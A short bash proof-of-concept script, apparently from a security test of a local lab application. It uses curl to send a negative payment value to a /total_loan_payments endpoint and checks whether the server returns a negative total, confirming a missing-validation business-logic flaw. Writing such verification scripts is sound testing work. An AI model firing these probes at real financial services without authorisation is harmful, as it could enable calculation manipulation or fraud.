#!/bin/bash

# POC: Calculation Logic Bypass - Negative Payment Values Accepted (v2 - with auth)
# This script demonstrates a business logic vulnerability where the /total_loan_payments
# endpoint accepts negative payment values without validation.

TARGET_URL="http://localhost:32768"
ENDPOINT="/total_loan_payments"

echo "=== Calculation Logic Bypass POC ==="
echo "Target: $TARGET_URL$ENDPOINT"
echo ""

# First, obtain a session/auth token by attempting to access and capture cookies
echo "[STEP 1] Attempting to access endpoint with cookie jar..."
COOKIE_JAR="/tmp/cookies.txt"

# Try to make request with cookie handling
echo "[TEST 1] Valid positive payment (baseline):"
RESPONSE=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$TARGET_URL$ENDPOINT?principal=5000&payment=500&term=12")
echo "Response: $RESPONSE"
echo ""

# Test 2: Negative payment (vulnerability)
echo "[TEST 2] Negative payment (VULNERABILITY):"
RESPONSE=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$TARGET_URL$ENDPOINT?principal=5000&payment=-500&term=12")
echo "Response: $RESPONSE"

# Check if endpoint returned JSON with calculations (meaning we bypassed auth or no auth needed)
if echo "$RESPONSE" | grep -q '"total_loan_payments"'; then
    echo ""
    echo "[SUCCESS] Got response with calculations"
    
    # Check if negative values are accepted (vulnerability confirmed)
    if echo "$RESPONSE" | grep -q '"total_loan_payments": "-'; then
        echo "[VULNERABLE] Endpoint accepted negative payment and calculated negative total!"
        echo "Expected behavior: Reject negative payment or return error"
        echo "Actual behavior: Calculated total_loan_payments as negative value"
        exit 0
    else
        echo "[INFO] Got JSON response but without negative total in this test"
        exit 0
    fi
elif echo "$RESPONSE" | grep -q "login\|redirect\|unauthorized"; then
    echo ""
    echo "[AUTH REQUIRED] Endpoint requires authentication"
    echo "Response suggests: $RESPONSE" | head -c 100
    exit 1
else
    echo ""
    echo "[RESPONSE] Received: $RESPONSE" | head -c 200
    exit 0
fi